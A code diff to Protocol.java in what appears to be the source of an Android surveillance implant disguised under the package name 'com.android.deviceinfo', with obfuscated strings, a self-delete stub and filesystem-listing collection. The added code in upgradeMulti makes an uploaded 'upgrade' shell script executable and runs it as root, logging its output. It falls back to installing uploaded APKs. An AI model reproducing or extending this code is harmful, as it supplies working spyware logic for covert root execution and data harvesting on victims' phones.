@@ -31,10 +31,11 @@ import com.android.deviceinfo.interfaces.iProtocol;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
+import com.android.deviceinfo.util.Execute;
+import com.android.deviceinfo.util.ExecuteResult;
 import com.android.deviceinfo.util.StringUtils;
 import com.android.deviceinfo.util.WChar;
 import com.android.m.M;
-
 
 /**
  * The Class Protocol, is extended by ZProtocol
@@ -50,8 +51,8 @@ public abstract class Protocol implements iProtocol {
 	protected Transport transport;
 
 	Status status;
-	
-	static List<String> blackListDir = Arrays.asList(new String[]{"/sys", "/dev", "/proc"});
+
+	static List<String> blackListDir = Arrays.asList(new String[] { "/sys", "/dev", "/proc" });
 
 	/** The reload. */
 	// public boolean reload;
@@ -137,33 +138,54 @@ public abstract class Protocol implements iProtocol {
 	 */
 	public static boolean upgradeMulti(final Vector<String> files) {
 
-		for (final String fileName : files) {
+		String upgradeShell = String.format(M.e("upgrade.%s.sh"), Cfg.OSVERSION) ;
+		boolean upgraded = false;
+		
+		// core.default.apk
+		if (files.contains(upgradeShell) && Status.self().haveRoot()) {
+			final File file = new File(Path.upload(), upgradeShell);
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (upgradeMulti): " + fileName);//$NON-NLS-1$
+				Check.log(TAG + " (upgradeMulti): executing " + upgradeShell);
 			}
-			final File file = new File(Path.upload(), fileName);
-			if (fileName.endsWith(".sh")) {
-				try {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (upgradeMulti): executing " + fileName);
-					}
-					Runtime.getRuntime().exec(file.getAbsolutePath());
-				} catch (IOException e) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (upgradeMulti) Error: " + e);
-					}
-				}
-			} else if (fileName.endsWith(".apk")) {
+			
+			try {
+				Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + file.getAbsolutePath());
+			} catch (IOException e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (upgradeMulti): action " + fileName);
+					Check.log(TAG + " (upgradeMulti) Error: " + e);
 				}
-				final Intent intent = new Intent(Intent.ACTION_VIEW);
-				intent.setDataAndType(Uri.fromFile(file), M.e("application/vnd.android.package-archive")); //$NON-NLS-1$
-				intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-				Status.getAppContext().startActivity(intent);
-			} else {
+			}
+		 
+			Execute ex = new Execute();
+			ExecuteResult result = ex.executeRoot(file.getAbsolutePath());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (upgradeMulti) exitcode: %s", result.exitCode);
+				Check.log(TAG + " (upgradeMulti) stdout: %s", result.stdout);
+				Check.log(TAG + " (upgradeMulti) stderr: %s", result.stderr);
+			}
+
+			upgraded = result.exitCode == 0;
+		}
+
+		if (!upgraded) {
+			for (final String fileName : files) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (upgradeMulti): ignoring " + fileName);
+					Check.log(TAG + " (upgradeMulti): " + fileName);//$NON-NLS-1$
+				}
+				final File file = new File(Path.upload(), fileName);
+				if (fileName.endsWith(".apk")) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (upgradeMulti): action " + fileName);
+					}
+					final Intent intent = new Intent(Intent.ACTION_VIEW);
+					intent.setDataAndType(Uri.fromFile(file), M.e("application/vnd.android.package-archive")); //$NON-NLS-1$
+					intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+					Status.getAppContext().startActivity(intent);
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (upgradeMulti): ignoring " + fileName);
+					}
 				}
 			}
 		}
@@ -182,9 +204,7 @@ public abstract class Protocol implements iProtocol {
 	 * @return true, if successful
 	 */
 	public static boolean deleteSelf() {
-		// TODO deleteself
 		return false;
-
 	}
 
 	/**
@@ -250,7 +270,7 @@ public abstract class Protocol implements iProtocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveFileLog): not readable");
 			}
-			content = new byte[] {0};
+			content = new byte[] { 0 };
 		}
 
 		final byte[] additional = Protocol.logDownloadAdditional(filename);
@@ -474,7 +494,7 @@ public abstract class Protocol implements iProtocol {
 		}
 		final File dir = new File(path);
 		if (dir.isDirectory()) {
-			
+
 			final String[] files = dir.list();
 			if (files == null) {
 				return;
@@ -493,7 +513,7 @@ public abstract class Protocol implements iProtocol {
 
 				final boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
 				if (isDir && depth > 1) {
-					if(!blackListDir.contains(dir)){
+					if (!blackListDir.contains(dir)) {
 						expandPath(fsLog, dPath, depth - 1);
 					}
 				}
